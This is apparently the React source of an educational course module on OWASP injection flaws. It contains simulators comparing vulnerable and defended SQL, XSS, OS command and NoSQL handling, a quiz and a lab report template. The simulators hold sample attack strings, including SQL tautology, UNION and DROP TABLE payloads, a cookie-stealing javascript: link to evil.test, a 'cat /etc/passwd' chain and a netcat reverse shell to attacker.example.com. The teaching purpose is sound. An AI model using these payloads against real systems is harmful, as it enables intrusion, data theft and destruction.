import React, { useState, useMemo } from "react";
import { useNavigate } from "react-router-dom";
import {
  ArrowLeft,
  ArrowRight,
  BookOpen,
  CheckCircle2,
  ChevronDown,
  ChevronUp,
  Globe,
  Layers,
  Terminal,
  Shield,
  Activity,
  Play,
  RotateCcw,
  Sliders,
  Copy,
  Check,
  Server,
  Network,
  HelpCircle,
  Award,
  AlertTriangle,
  Sparkles,
  Lock,
  Workflow,
  Zap,
  Boxes,
  Compass,
  FileCode,
  ShieldCheck,
  RefreshCw,
  Cpu,
  Monitor,
  HardDrive,
  Clock,
  Gauge,
  SlidersHorizontal,
  ExternalLink,
  Eye,
  FileText,
  Key,
  Database,
  Search,
  AlertCircle,
  FileSpreadsheet,
  TerminalSquare,
  Binary,
  FolderGit2,
  Filter,
  ShieldAlert,
  Target,
  Crosshair,
  UserCheck,
  UserX,
  FileWarning,
  Flame,
  CheckSquare,
  Square,
  PlusCircle,
  Trash2,
  Download,
  Fingerprint,
  Radio,
  FileCheck2,
  ListFilter,
  CheckCheck,
  TrendingUp,
  Wifi,
  Split,
  Router,
  Ban,
  RadioTower,
  KeyRound,
  FileKey,
  LockKeyhole,
  Users,
  UserCog,
  FileLock2,
  FolderLock,
  Wrench,
  FilePlus,
  ShieldX,
  History,
  FileCheck,
  EyeOff,
  ClipboardList,
  Smartphone,
  QrCode,
  KeySquare,
  Share2,
  UserMinus,
  UserPlus,
  ShieldQuestion,
  FingerprintIcon,
  Unlock,
  KeyRoundIcon,
  BadgeCheck,
  Unplug,
  ZapOff,
  Cookie,
  Code2,
  Bug,
  Braces,
  ChevronRight,
  FolderTree,
  FileSpreadsheetIcon,
} from "lucide-react";
import LearningRo from "./LearningRo";
import ModuleNav from "./ModuleNav";
import { useSyncedTopic } from "../utils/navigation";

/* -------------------------------------------------------------------------- */
/* PREPSPACES CYBERSECURITY MASTER COURSE: MODULE 14                          */
/* OWASP Top 10, Injection Vulnerabilities & Secure Input Handling            */
/* Informed by OWASP Top 10: 2025 (A05 Injection), NIST SP 800-40, WSTG & ASVS*/
/* -------------------------------------------------------------------------- */

export default function CybersecurityInjection() {
  const navigate = useNavigate();

  // Navigation & Workspace State
  const [selectedTopic, setSelectedTopic] = useSyncedTopic(1);
  const [showAiTutor, setShowAiTutor] = useState(false);
  const [activeTab, setActiveTab] = useState("theory"); // 'theory' | 'sqli-sim' | 'xss-sim' | 'cmd-sim' | 'nosql-sim' | 'quiz'
  const [copiedCodeId, setCopiedCodeId] = useState(null);

  const copyCode = (code, id) => {
    navigator.clipboard.writeText(code);
    setCopiedCodeId(id);
    setTimeout(() => setCopiedCodeId(null), 2000);
  };

  /* -------------------------------------------------------------------------- */
  /* SIMULATOR 1: SQL INJECTION VS PARAMETERIZED QUERY DEFENSE ENGINE           */
  /* -------------------------------------------------------------------------- */
  const [sqliPayloadType, setSqliPayloadType] = useState("tautology");
  // 'tautology' | 'union' | 'stacked' | 'comment' | 'time_blind' | 'benign'
  const [sqliDefenseMode, setSqliDefenseMode] = useState("parameterized"); // 'vulnerable' | 'parameterized'

  const sqliSimulation = useMemo(() => {
    let rawInput = "";
    if (sqliPayloadType === "tautology") {
      rawInput = `' OR '1'='1`;
    } else if (sqliPayloadType === "comment") {
      rawInput = `admin' --`;
    } else if (sqliPayloadType === "union") {
      rawInput = `' UNION SELECT id, username, password_hash, 1 FROM admin_users --`;
    } else if (sqliPayloadType === "stacked") {
      rawInput = `'; DROP TABLE candidate_interviews; --`;
    } else if (sqliPayloadType === "time_blind") {
      rawInput = `test' AND (SELECT pg_sleep(3)) --`;
    } else {
      rawInput = `samarth.sharma@prepspaces.com`;
    }

    let constructedQuery = "";
    let executionOutcome = "";
    let astMutated = false;
    let recordsReturned = 0;
    let securityGrade = "HARDENED";

    if (sqliDefenseMode === "vulnerable") {
      constructedQuery = `SELECT * FROM candidate_interviews WHERE email = '${rawInput}' AND is_active = true`;
      if (sqliPayloadType === "benign") {
        astMutated = false;
        executionOutcome = "Query executed normally. Found 1 student interview record matching 'samarth.sharma@prepspaces.com'.";
        recordsReturned = 1;
        securityGrade = "FRAGILE";
      } else if (sqliPayloadType === "tautology") {
        astMutated = true;
        executionOutcome =
          "CRITICAL BYPASS: WHERE clause evaluated to TRUE ('1'='1'). The query dumped all 1,240 candidate interview records across all tenants!";
        recordsReturned = 1240;
        securityGrade = "EXPLOITED";
      } else if (sqliPayloadType === "comment") {
        astMutated = true;
        executionOutcome =
          "AUTHENTICATION BYPASS: Trailing conditions (-- comment) ignored. Logged in as 'admin' without password verification!";
        recordsReturned = 1;
        securityGrade = "EXPLOITED";
      } else if (sqliPayloadType === "union") {
        astMutated = true;
        executionOutcome =
          "DATA EXFILTRATION: UNION injected. Sensitive password hashes and salts from 'admin_users' leaked in response payload!";
        recordsReturned = 8;
        securityGrade = "EXPLOITED";
      } else if (sqliPayloadType === "stacked") {
        astMutated = true;
        executionOutcome =
          "CATASTROPHIC DATA DESTRUCTION: Stacked query executed! Table 'candidate_interviews' deleted permanently!";
        recordsReturned = 0;
        securityGrade = "EXPLOITED";
      } else if (sqliPayloadType === "time_blind") {
        astMutated = true;
        executionOutcome =
          "TIME-BASED BLIND SQLi: Database server paused for 3,000ms. Blind inference confirmed vulnerability!";
        recordsReturned = 1;
        securityGrade = "EXPLOITED";
      }
    } else {
      // Parameterized statement
      constructedQuery = `PREPARE stmt(text) AS SELECT * FROM candidate_interviews WHERE email = $1 AND is_active = true;\nEXECUTE stmt('${rawInput.replace(/'/g, "''")}');`;
      astMutated = false;
      if (sqliPayloadType === "benign") {
        executionOutcome = "Parameterized query executed cleanly. Found 1 matching record.";
        recordsReturned = 1;
      } else {
        executionOutcome = `ATTACK DEFENDED: Database driver treated the entire string literal ("${rawInput}") as an atomic scalar value $1. No SQL syntax altered. Found 0 records matching literal payload.`;
        recordsReturned = 0;
      }
      securityGrade = "HARDENED";
    }

    return {
      rawInput,
      constructedQuery,
      executionOutcome,
      astMutated,
      recordsReturned,
      securityGrade,
    };
  }, [sqliPayloadType, sqliDefenseMode]);

  /* -------------------------------------------------------------------------- */
  /* SIMULATOR 2: CONTEXT-AWARE OUTPUT ENCODING & XSS PREVENTION LAB             */
  /* -------------------------------------------------------------------------- */
  const [outputContext, setOutputContext] = useState("html_body");
  // 'html_body' | 'html_attribute' | 'javascript_var' | 'url_href'
  const [xssAttackPayload, setXssAttackPayload] = useState("script_tag");
  // 'script_tag' | 'attr_onfocus' | 'js_breakout' | 'javascript_pseudo'
  const [encodingStrategy, setEncodingStrategy] = useState("context_safe");
  // 'none' | 'naive_html' | 'context_safe'

  const xssContextData = useMemo(() => {
    let payload = "";
    if (xssAttackPayload === "script_tag") payload = `<script>alert('XSS: Session Hijacked!')</script>`;
    if (xssAttackPayload === "attr_onfocus") payload = `" onfocus="alert('XSS Attribute')`;
    if (xssAttackPayload === "js_breakout") payload = `"; alert('XSS in Script'); //`;
    if (xssAttackPayload === "javascript_pseudo") payload = `javascript:fetch('https://evil.test/?c='+document.cookie)`;

    let renderedSink = "";
    let isVulnerable = false;
    let diagnosis = "";

    if (outputContext === "html_body") {
      if (encodingStrategy === "none") {
        renderedSink = `<div>${payload}</div>`;
        isVulnerable = payload.includes("<script");
        diagnosis = isVulnerable
          ? "CRITICAL XSS: Browser HTML parser encountered an unescaped <script> tag and executed it immediately."
          : "Potentially unsafe unencoded insertion.";
      } else if (encodingStrategy === "naive_html" || encodingStrategy === "context_safe") {
        renderedSink = `<div>${payload.replace(/</g, "&lt;").replace(/>/g, "&gt;")}</div>`;
        isVulnerable = false;
        diagnosis = "SAFE: HTML entity encoding (&lt; &gt;) rendered the payload strictly as visual text characters.";
      }
    } else if (outputContext === "html_attribute") {
      if (encodingStrategy === "none") {
        renderedSink = `<input type="text" value="${payload}" />`;
        isVulnerable = payload.includes('"');
        diagnosis = isVulnerable
          ? "CRITICAL XSS: Double-quote broke out of value attribute context, injecting active event handler (onfocus)!"
          : "Attribute value set.";
      } else if (encodingStrategy === "naive_html") {
        // Naive HTML encoder only escapes < and > but leaves quotes or apostrophes!
        renderedSink = `<input type="text" value="${payload.replace(/</g, "&lt;").replace(/>/g, "&gt;")}" />`;
        isVulnerable = payload.includes('"');
        diagnosis = isVulnerable
          ? "HAZARD: Naive HTML encoding (&lt; &gt;) failed! It left double quotes unescaped, allowing attribute breakout."
          : "Safe.";
      } else {
        // Context-aware attribute encoding escapes quotes and ampersands
        renderedSink = `<input type="text" value="${payload
          .replace(/&/g, "&amp;")
          .replace(/"/g, "&quot;")
          .replace(/'/g, "&#39;")}" />`;
        isVulnerable = false;
        diagnosis = "SAFE: Proper attribute encoding (&quot; &#39;) keeps the value strictly inside quotes.";
      }
    } else if (outputContext === "javascript_var") {
      if (encodingStrategy === "none" || encodingStrategy === "naive_html") {
        renderedSink = `<script>const candidate = "${payload}";</script>`;
        isVulnerable = payload.includes('";');
        diagnosis = isVulnerable
          ? "CRITICAL XSS: Injected quote broke out of JavaScript string literal. HTML encoding offers zero defense inside a script block!"
          : "String literal initialized.";
      } else {
        // Safe serialization: JSON.stringify / safe hex encoding
        renderedSink = `<script>const candidate = ${JSON.stringify(payload)};</script>`;
        isVulnerable = false;
        diagnosis = "SAFE: JSON.stringify escapes quotes and control characters, ensuring safe JavaScript variable initialization.";
      }
    } else if (outputContext === "url_href") {
      if (encodingStrategy === "none" || encodingStrategy === "naive_html") {
        renderedSink = `<a href="${payload}">View Interview Certificate</a>`;
        isVulnerable = payload.toLowerCase().startsWith("javascript:");
        diagnosis = isVulnerable
          ? "CRITICAL XSS: Browser executes 'javascript:' pseudo-protocol when the victim clicks the link. HTML encoding does not prevent URL protocol execution!"
          : "Link created.";
      } else {
        // Scheme validation allowlist
        const isSafeProtocol = payload.startsWith("https://") || payload.startsWith("http://") || payload.startsWith("/");
        renderedSink = isSafeProtocol
          ? `<a href="${encodeURI(payload)}">View Interview Certificate</a>`
          : `<a href="#invalid-protocol">Blocked Protocol</a>`;
        isVulnerable = false;
        diagnosis = "SAFE: Protocol allowlist rejected 'javascript:' URI scheme, forcing strict HTTPS/HTTP verification.";
      }
    }

    return {
      payload,
      renderedSink,
      isVulnerable,
      diagnosis,
    };
  }, [outputContext, xssAttackPayload, encodingStrategy]);

  /* -------------------------------------------------------------------------- */
  /* SIMULATOR 3: OS COMMAND & ARGUMENT INJECTION SANDBOX                       */
  /* -------------------------------------------------------------------------- */
  const [cmdInputPayload, setCmdInputPayload] = useState("normal_file");
  // 'normal_file' | 'chained_semicolon' | 'pipe_netcat' | 'ampersand_id' | 'arg_injection'
  const [cmdDefenseMode, setCmdDefenseMode] = useState("safe_args"); // 'unsafe_shell' | 'safe_args'

  const cmdSimulation = useMemo(() => {
    let userInput = "";
    if (cmdInputPayload === "normal_file") {
      userInput = "interview_recording.mp4";
    } else if (cmdInputPayload === "chained_semicolon") {
      userInput = "sample.mp4; cat /etc/passwd";
    } else if (cmdInputPayload === "ampersand_id") {
      userInput = "sample.mp4 && id";
    } else if (cmdInputPayload === "pipe_netcat") {
      userInput = "sample.mp4 | nc attacker.example.com 4444 -e /bin/sh";
    } else if (cmdInputPayload === "arg_injection") {
      userInput = "--output=/etc/shadow";
    }

    let commandLine = "";
    let executedProcesses = [];
    let isCommandInjected = false;
    let terminalOutput = "";

    if (cmdDefenseMode === "unsafe_shell") {
      commandLine = `/bin/sh -c "ffmpeg -i ${userInput} output.wav"`;
      if (cmdInputPayload === "normal_file") {
        executedProcesses = ["/bin/sh", "ffmpeg -i interview_recording.mp4 output.wav"];
        terminalOutput = "[ffmpeg] Processing interview_recording.mp4... Success. Generated output.wav (14.2 MB)";
        isCommandInjected = false;
      } else if (cmdInputPayload === "chained_semicolon") {
        executedProcesses = ["/bin/sh", "ffmpeg -i sample.mp4", "cat /etc/passwd"];
        terminalOutput =
          "[ffmpeg] Failed to open sample.mp4\nroot:x:0:0:root:/root:/bin/bash\nprepspaces:x:1001:1001:app:/var/www:/bin/sh\n[COMMAND INJECTION SUCCESSFUL: Arbitrary file contents dumped]";
        isCommandInjected = true;
      } else if (cmdInputPayload === "ampersand_id") {
        executedProcesses = ["/bin/sh", "id"];
        terminalOutput = "uid=1001(prepspaces) gid=1001(prepspaces) groups=1001(prepspaces),27(sudo)";
        isCommandInjected = true;
      } else if (cmdInputPayload === "pipe_netcat") {
        executedProcesses = ["/bin/sh", "ffmpeg", "nc attacker.example.com 4444 -e /bin/sh"];
        terminalOutput = "[Reverse Shell Initiated: Connected to attacker.example.com:4444]";
        isCommandInjected = true;
      } else if (cmdInputPayload === "arg_injection") {
        executedProcesses = ["/bin/sh", "ffmpeg --output=/etc/shadow"];
        terminalOutput = "[Argument Injection: ffmpeg option overwritten target path without invoking shell]";
        isCommandInjected = true;
      }
    } else {
      // Safe Process API without shell
      commandLine = `child_process.execFile("ffmpeg", ["-i", "${userInput.replace(/"/g, '\\"')}", "output.wav"], { shell: false })`;
      if (cmdInputPayload === "normal_file") {
        executedProcesses = ["ffmpeg (isolated process)"];
        terminalOutput = "[ffmpeg] Processing interview_recording.mp4... Success. Generated output.wav (14.2 MB)";
      } else {
        executedProcesses = ["ffmpeg (isolated process)"];
        terminalOutput = `[ffmpeg ERROR] Cannot find file: '${userInput}'. Shell metacharacters (; && |) were treated strictly as literal filename bytes because shell was disabled!`;
      }
      isCommandInjected = false;
    }

    return {
      userInput,
      commandLine,
      executedProcesses,
      isCommandInjected,
      terminalOutput,
    };
  }, [cmdInputPayload, cmdDefenseMode]);

  /* -------------------------------------------------------------------------- */
  /* SIMULATOR 4: NOSQL INJECTION & OPERATOR MANIPULATION LAB                   */
  /* -------------------------------------------------------------------------- */
  const [nosqlPayload, setNosqlPayload] = useState("ne_bypass"); // 'ne_bypass' | 'gt_bypass' | 'regex_match' | 'normal_auth'
  const [nosqlValidation, setNosqlValidation] = useState("schema_enforced"); // 'blind_pass' | 'schema_enforced'

  const nosqlSimulation = useMemo(() => {
    let reqBody = {};
    if (nosqlPayload === "ne_bypass") {
      reqBody = { email: "candidate@prepspaces.com", password: { $ne: "" } };
    } else if (nosqlPayload === "gt_bypass") {
      reqBody = { email: "candidate@prepspaces.com", password: { $gt: "" } };
    } else if (nosqlPayload === "regex_match") {
      reqBody = { email: { $regex: "^admin.*" }, password: { $ne: null } };
    } else {
      reqBody = { email: "candidate@prepspaces.com", password: "SecretPassword123!" };
    }

    let constructedFilter = "";
    let bypassSuccess = false;
    let explanation = "";

    if (nosqlValidation === "blind_pass") {
      constructedFilter = JSON.stringify(reqBody, null, 2);
      if (nosqlPayload === "normal_auth") {
        bypassSuccess = false;
        explanation = "Normal authentication. Verified password hash against database record.";
      } else {
        bypassSuccess = true;
        explanation =
          "CRITICAL NOSQL INJECTION: Client JSON contained MongoDB query operator ($ne / $gt / $regex). Backend passed the raw object into db.collection.findOne(), bypassing password verification!";
      }
    } else {
      // Schema validation & primitive type enforcement
      const sanitizedBody = {
        email: typeof reqBody.email === "string" ? reqBody.email : "",
        password: typeof reqBody.password === "string" ? reqBody.password : "",
      };
      constructedFilter = JSON.stringify(sanitizedBody, null, 2);
      if (nosqlPayload === "normal_auth") {
        bypassSuccess = false;
        explanation = "Schema validation verified that email and password are primitive strings. Query executed safely.";
      } else {
        bypassSuccess = false;
        explanation =
          "ATTACK DEFENDED: Schema validator stripped query operators ($ne / $gt). Input rejected because password was an object rather than a primitive string!";
      }
    }

    return {
      reqBody: JSON.stringify(reqBody, null, 2),
      constructedFilter,
      bypassSuccess,
      explanation,
    };
  }, [nosqlPayload, nosqlValidation]);

  /* -------------------------------------------------------------------------- */
  /* KNOWLEDGE ASSESSMENT QUIZ (14.14 - 10 Questions)                           */
  /* -------------------------------------------------------------------------- */
  const quizQuestions = [
    {
      id: 1,
      question: "Which edition of the OWASP Top 10 is covered in this module?",
      options: ["2021", "2023", "2025", "2026"],
      correct: 2,
      explanation:
        "The current authoritative release covered in this module is the OWASP Top 10: 2025 edition, where Injection is categorized as A05.",
    },
    {
      id: 2,
      question: "What is the primary defense against SQL injection?",
      options: [
        "Remove every punctuation character",
        "Use parameterized queries",
        "Hide database errors only",
        "Validate input only in the browser",
      ],
      correct: 1,
      explanation:
        "Parameterized queries (prepared statements) bind untrusted values separately from the SQL statement structure, ensuring the database engine interprets the input strictly as literal data.",
    },
    {
      id: 3,
      question: "Why is client-side validation insufficient?",
      options: [
        "Browsers cannot validate strings",
        "It can be bypassed by sending requests directly",
        "It automatically causes XSS",
        "It disables HTTPS",
      ],
      correct: 1,
      explanation:
        "The client browser is completely controlled by the user. An attacker or HTTP client (curl, Burp Suite, Python) can forge requests directly to the backend API, bypassing frontend JavaScript checks entirely.",
    },
    {
      id: 4,
      question: "Which API is safer for displaying untrusted plain text in the DOM?",
      options: ["innerHTML", "eval", "textContent", "document.write with raw input"],
      correct: 2,
      explanation:
        "textContent assigns the value directly to a text node without invoking the browser's HTML parser, guaranteeing that angle brackets and quotes cannot be interpreted as markup or executable scripts.",
    },
    {
      id: 5,
      question: "What is the main concern with OS command injection?",
      options: [
        "A database table is too large",
        "Untrusted data changes command interpretation",
        "A cookie expires too early",
        "A browser refuses a stylesheet",
      ],
      correct: 1,
      explanation:
        "OS command injection occurs when untrusted input is interpolated into shell commands, allowing shell metacharacters (; && | `) to execute arbitrary operating system commands.",
    },
    {
      id: 6,
      question: "Does a parameterized SQL query automatically enforce record ownership?",
      options: [
        "Yes, always",
        "No; authorization must be enforced separately",
        "Only when the database is local",
        "Only when the frontend uses React",
      ],
      correct: 1,
      explanation:
        "Parameterized queries prevent SQL injection, but they do not enforce authorization. If the query fetches data using a client-supplied ID without verifying ownership against the authenticated session, BOLA/IDOR still exists.",
    },
    {
      id: 7,
      question: "What is the correct way to handle an unexpected file-upload type?",
      options: [
        "Trust the filename extension",
        "Execute it to identify its type",
        "Reject it according to the application's upload policy",
        "Store it in a public executable directory",
      ],
      correct: 2,
      explanation:
        "Applications must enforce a strict allowlist of accepted MIME types and magic bytes, immediately rejecting any unapproved or anomalous file types before storage.",
    },
    {
      id: 8,
      question: "Which statement about escaping is correct?",
      options: [
        "One escaping function is safe in every context",
        "HTML encoding replaces authorization checks",
        "Encoding should match the output context",
        "Escaping is always better than parameterization",
      ],
      correct: 2,
      explanation:
        "Output encoding is strictly context-dependent. Standard HTML entity encoding (&lt; &gt;) protects HTML body text, but offers zero protection inside JavaScript script tags, URL attributes (javascript:), or CSS properties.",
    },
    {
      id: 9,
      question: "What is server-side template injection (SSTI)?",
      options: [
        "A cookie configuration error",
        "Untrusted input being interpreted as template syntax",
        "A failed DNS lookup",
        "A missing database index",
      ],
      correct: 1,
      explanation:
        "SSTI happens when user input is concatenated directly into template engine strings (Jinja2, Twig, EJS) rather than passed as data values, allowing attackers to execute server-side code.",
    },
    {
      id: 10,
      question: "What is the role of a WAF?",
      options: [
        "Guarantee the application has no vulnerabilities",
        "Replace secure coding",
        "Provide an additional layer of request filtering and detection",
        "Automatically fix broken authorization",
      ],
      correct: 2,
      explanation:
        "A Web Application Firewall (WAF) operates as a defense-in-depth inspection filter. It can detect and block known signature patterns, but cannot fix vulnerable underlying business logic or broken authorization.",
    },
  ];

  const [quizAnswers, setQuizAnswers] = useState({});
  const [quizSubmitted, setQuizSubmitted] = useState(false);

  const handleSelectAnswer = (qId, optionIdx) => {
    if (quizSubmitted) return;
    setQuizAnswers((prev) => ({ ...prev, [qId]: optionIdx }));
  };

  const quizScore = useMemo(() => {
    let score = 0;
    quizQuestions.forEach((q) => {
      if (quizAnswers[q.id] === q.correct) score++;
    });
    return score;
  }, [quizAnswers]);

  /* -------------------------------------------------------------------------- */
  /* LAB REPORT GENERATOR STATE (14.13)                                         */
  /* -------------------------------------------------------------------------- */
  const [labScope, setLabScope] = useState("OWASP Juice Shop / Local Development API");
  const [labFinding, setLabFinding] = useState("Unsafe SQL string interpolation in GET /api/v1/interviews/search");
  const [labRootCause, setLabRootCause] = useState("Direct string concatenation: query = 'SELECT * FROM items WHERE name LIKE ' + input");
  const [labImpact, setLabImpact] = useState("Critical: Complete database extraction via UNION SQLi and potential authentication bypass");
  const [labRemediation, setLabRemediation] = useState("Migrated query to parameterized prepared statement with bound placeholders ($1).");
  const [labVerification, setLabVerification] = useState("Regression test passing: Special characters (' OR '1'='1) treated as literal text; 0 unauthorized records returned.");
  const [reportCopied, setReportCopied] = useState(false);

  const copyLabReport = () => {
    const reportText = `=====================================================
PREPSPACES INJECTION VULNERABILITY ASSESSMENT REPORT
=====================================================
Scope & Target:     ${labScope}
Finding Title:      ${labFinding}
Root Cause:         ${labRootCause}
Assessed Impact:    ${labImpact}

REMEDIATION APPLIED:
${labRemediation}

VERIFICATION & REGRESSION TESTING:
${labVerification}

Standard: OWASP Top 10: 2025 — A05: Injection
Generated: ${new Date().toISOString()}
=====================================================`;
    navigator.clipboard.writeText(reportText);
    setReportCopied(true);
    setTimeout(() => setReportCopied(false), 2500);
  };

  return (
    <div className="min-h-screen bg-[#faf8f5] text-stone-900 font-sans selection:bg-orange-100 selection:text-orange-900">
      {/* Top Header */}
      <div className="border-b border-[#eae6de] bg-white/80 backdrop-blur-md sticky top-0 z-30">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-3">
          <ModuleNav
            track="cybersecurity"
            currentModuleId="injection"
            showAiTutor={showAiTutor}
            onAiTutorToggle={() => setShowAiTutor(!showAiTutor)}
            aiTutorLabel="Injection Defense AI Mentor"
          />
        </div>
      </div>

      {/* Hero Banner */}
      <div className="border-b border-stone-200 bg-gradient-to-b from-[#f9f7f2] to-[#f4f0e6] px-4 sm:px-6 lg:px-8 py-8">
        <div className="max-w-7xl mx-auto">
          <div className="flex flex-col md:flex-row md:items-center justify-between gap-6">
            <div className="space-y-3">
              <div className="inline-flex items-center space-x-2 px-2.5 py-1 rounded-full bg-orange-100 border border-orange-200 text-orange-800 font-bold text-xs font-mono">
                <Bug className="w-3.5 h-3.5" />
                <span>OWASP Top 10: 2025 · A05: Injection · NIST SP 800-40</span>
              </div>
              <h1 className="text-2xl sm:text-3xl lg:text-4xl font-extrabold tracking-tight text-stone-900">
                OWASP Top 10, Injection Vulnerabilities & Secure Input Handling
              </h1>
              <p className="text-sm sm:text-base text-stone-700 max-w-3xl leading-relaxed">
                Master the root causes of the injection vulnerability class: untrusted data mutating
                instruction interpreters across SQL databases, operating system shells, DOM sinks,
                NoSQL datastores, and server template engines. Engineer bulletproof defenses through
                parameterized prepared statements, context-aware output encoding, and trust-boundary
                schema validation.
              </p>
            </div>

            <div className="grid grid-cols-2 sm:grid-cols-3 gap-3 self-start md:self-auto min-w-[280px]">
              <div className="bg-white border border-stone-200/80 shadow-xs rounded-lg p-3">
                <div className="text-xs text-stone-600">Current Standard</div>
                <div className="text-sm font-bold text-orange-600">OWASP Top 10 (2025)</div>
              </div>
              <div className="bg-white border border-stone-200/80 shadow-xs rounded-lg p-3">
                <div className="text-xs text-stone-600">Primary Defense</div>
                <div className="text-sm font-bold text-emerald-400">Parameterized APIs</div>
              </div>
              <div className="bg-white border border-stone-200/80 shadow-xs rounded-lg p-3 col-span-2 sm:col-span-1">
                <div className="text-xs text-stone-600">Interactive Labs</div>
                <div className="text-sm font-bold text-amber-400">4 Sandboxes</div>
              </div>
            </div>
          </div>

          {/* Quick Nav Anchor Bar */}
          <div className="mt-8 flex flex-wrap items-center gap-2 border-t border-stone-200 pt-4">
            <button
              onClick={() => setActiveTab("theory")}
              className={`px-3 py-1.5 rounded-md text-xs font-medium transition flex items-center space-x-1.5 ${
                activeTab === "theory"
                  ? "bg-stone-900 text-white font-bold shadow-xs"
                  : "bg-white text-stone-600 hover:bg-stone-100 hover:text-stone-900 border border-stone-200"
              }`}
            >
              <BookOpen className="w-3.5 h-3.5" />
              <span>Theory & Architecture</span>
            </button>
            <button
              onClick={() => setActiveTab("sqli-sim")}
              className={`px-3 py-1.5 rounded-md text-xs font-medium transition flex items-center space-x-1.5 ${
                activeTab === "sqli-sim"
                  ? "bg-stone-900 text-white font-bold shadow-xs"
                  : "bg-white text-stone-600 hover:bg-stone-100 hover:text-stone-900 border border-stone-200"
              }`}
            >
              <Database className="w-3.5 h-3.5" />
              <span>Simulator 1: SQL Injection vs Prepared</span>
            </button>
            <button
              onClick={() => setActiveTab("xss-sim")}
              className={`px-3 py-1.5 rounded-md text-xs font-medium transition flex items-center space-x-1.5 ${
                activeTab === "xss-sim"
                  ? "bg-stone-900 text-white font-bold shadow-xs"
                  : "bg-white text-stone-600 hover:bg-stone-100 hover:text-stone-900 border border-stone-200"
              }`}
            >
              <FileCode className="w-3.5 h-3.5" />
              <span>Simulator 2: Context-Aware Encoding</span>
            </button>
            <button
              onClick={() => setActiveTab("cmd-sim")}
              className={`px-3 py-1.5 rounded-md text-xs font-medium transition flex items-center space-x-1.5 ${
                activeTab === "cmd-sim"
                  ? "bg-stone-900 text-white font-bold shadow-xs"
                  : "bg-white text-stone-600 hover:bg-stone-100 hover:text-stone-900 border border-stone-200"
              }`}
            >
              <Terminal className="w-3.5 h-3.5" />
              <span>Simulator 3: Command & Argument Injection</span>
            </button>
            <button
              onClick={() => setActiveTab("nosql-sim")}
              className={`px-3 py-1.5 rounded-md text-xs font-medium transition flex items-center space-x-1.5 ${
                activeTab === "nosql-sim"
                  ? "bg-stone-900 text-white font-bold shadow-xs"
                  : "bg-white text-stone-600 hover:bg-stone-100 hover:text-stone-900 border border-stone-200"
              }`}
            >
              <Braces className="w-3.5 h-3.5" />
              <span>Simulator 4: NoSQL Operator Injection</span>
            </button>
            <button
              onClick={() => setActiveTab("quiz")}
              className={`px-3 py-1.5 rounded-md text-xs font-medium transition flex items-center space-x-1.5 ${
                activeTab === "quiz"
                  ? "bg-stone-900 text-white font-bold shadow-xs"
                  : "bg-white text-stone-600 hover:bg-stone-100 hover:text-stone-900 border border-stone-200"
              }`}
            >
              <Award className="w-3.5 h-3.5" />
              <span>Quiz ({quizSubmitted ? `${quizScore}/10` : "10 Qs"})</span>
            </button>
          </div>
        </div>
      </div>

      {/* Main Layout */}
      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 flex-1 w-full grid grid-cols-1 lg:grid-cols-4 gap-8">
        {/* Left Column: Topics Sidebar */}
        <div className="lg:col-span-1 space-y-6">
          <div className="bg-stone-50/70 border border-stone-200 rounded-xl p-4 sticky top-20 space-y-4">
            <h3 className="text-xs font-bold text-stone-600 tracking-wider uppercase flex items-center justify-between">
              <span>Curriculum Navigator</span>
              <span className="text-orange-600 font-mono">14 / 24</span>
            </h3>

            <div className="space-y-1">
              {[
                { id: 1, title: "14.1 Module Overview & Objectives" },
                { id: 2, title: "14.2 OWASP Top 10 (2025 Edition)" },
                { id: 3, title: "14.3 The Injection Vulnerability Class" },
                { id: 4, title: "14.4 SQL Injection (SQLi) In-Depth" },
                { id: 5, title: "14.5 Cross-Site Scripting (XSS)" },
                { id: 6, title: "14.6 OS Command & Argument Injection" },
                { id: 7, title: "14.7 NoSQL Injection & Query Operators" },
                { id: 8, title: "14.8 Server-Side Template Injection (SSTI)" },
                { id: 9, title: "14.9 Path Traversal & Unsafe Files" },
                { id: 10, title: "14.10 Other Injection Vectors (LDAP/Log)" },
                { id: 11, title: "14.11 Secure Input-Handling Engineering" },
                { id: 12, title: "14.12 Multi-Layered Defense Model" },
                { id: 13, title: "14.13 Practical Lab & Deliverables" },
                { id: 14, title: "14.14 Knowledge Assessment" },
                { id: 15, title: "14.15 Official Learning References" },
                { id: 16, title: "14.16 Key Engineering Takeaways" },
              ].map((topic) => (
                <button
                  key={topic.id}
                  onClick={() => {
                    if (topic.id === 14) {
                      setActiveTab("quiz");
                    } else {
                      setSelectedTopic(topic.id);
                      setActiveTab("theory");
                    }
                  }}
                  className={`w-full text-left px-3 py-2 rounded-lg text-xs transition flex items-center justify-between ${
                    (selectedTopic || 1) === topic.id
                      ? "bg-orange-50 text-orange-950 font-semibold border border-orange-200 shadow-2xs"
                      : "text-stone-600 hover:bg-stone-50 hover:text-stone-900"
                  }`}
                >
                  <span className="truncate">{topic.title}</span>
                  {(selectedTopic || 1) === topic.id && (
                    <ChevronRight className="w-3.5 h-3.5 text-orange-600 shrink-0 ml-1" />
                  )}
                </button>
              ))}
            </div>
          </div>
        </div>

        {/* Right 3 Columns */}
        <div className="lg:col-span-3 space-y-8">
          {/* TAB: THEORY & ARCHITECTURE */}
          {activeTab === "theory" && (
            <div className="space-y-10">
              {/* 14.1 Module Overview */}
              {(selectedTopic === 1 || !selectedTopic || selectedTopic === 0) && (
              <section id="section-1" className="space-y-4">
                <div className="flex items-center space-x-2 text-orange-600 text-sm font-semibold tracking-wide">
                  <ShieldCheck className="w-4 h-4" />
                  <span>14.1 MODULE OVERVIEW</span>
                </div>
                <h2 className="text-2xl font-bold text-stone-900">
                  OWASP Top 10, Injection Mechanics & Secure Input Handling
                </h2>
                <p className="text-stone-700 text-sm sm:text-base leading-relaxed">
                  Web applications process data from users, browsers, APIs, databases, files, and
                  third-party services. Security vulnerabilities arise when applications trust that
                  data without correctly validating it, controlling how it is interpreted, or checking
                  whether the requester is authorized to use it.
                </p>
                <p className="text-stone-700 text-sm sm:text-base leading-relaxed">
                  This module introduces the OWASP Top 10 as an application security awareness
                  framework, explores injection vulnerabilities in depth, and develops secure
                  input-handling practices for real-world production environments.
                </p>

                {/* Learning Objectives Callout */}
                <div className="bg-cyan-950/20 border border-cyan-800/40 rounded-xl p-5 space-y-3">
                  <h4 className="text-sm font-bold text-orange-700 flex items-center space-x-2">
                    <Target className="w-4 h-4 text-orange-600" />
                    <span>Learning Objectives</span>
                  </h4>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 text-xs text-stone-700">
                    <div className="flex items-start space-x-2">
